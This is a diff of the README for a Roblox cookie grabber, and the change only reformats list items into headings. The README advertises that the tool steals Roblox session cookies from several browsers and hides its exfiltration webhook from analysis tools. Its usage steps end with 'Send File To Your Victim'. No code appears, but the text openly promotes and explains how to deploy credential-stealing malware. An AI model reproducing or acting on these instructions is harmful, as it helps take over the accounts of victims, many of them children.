@@ -20,16 +20,16 @@
 -  Has Protection To The Grabber
  - Added Where Its Harder To Get The Webhook If They Process Hacker OR Etc To Get The Webhook
 # How To Use
-- Make Sure To Have Python Install And Pip Added To Path
-- Then Run Install.bat
-- Then Run Builder.py
-- Then Fill Out Info In Builder.Py
-- Then Send File To Your Victim
+### Make Sure To Have Python Installed And Pip Added To Path
+### Then Run Install.bat
+### Then Run Builder.py
+### Then Fill Out Info In Builder.Py
+### Then Send File To Your Victim
 
 # To Do
-- ✅ Make Where It Grabs The Roblox Cookie From More Browsers
-- ✅ Make A Complied Version 
-- ✅  Adding Protection To The Grabber
+### ✅ Make Where It Grabs The Roblox Cookie From More Browsers
+### ✅ Make A Complied Version 
+### ✅  Adding Protection To The Grabber
 # Credits
 Made By:
 Joseyt#1935
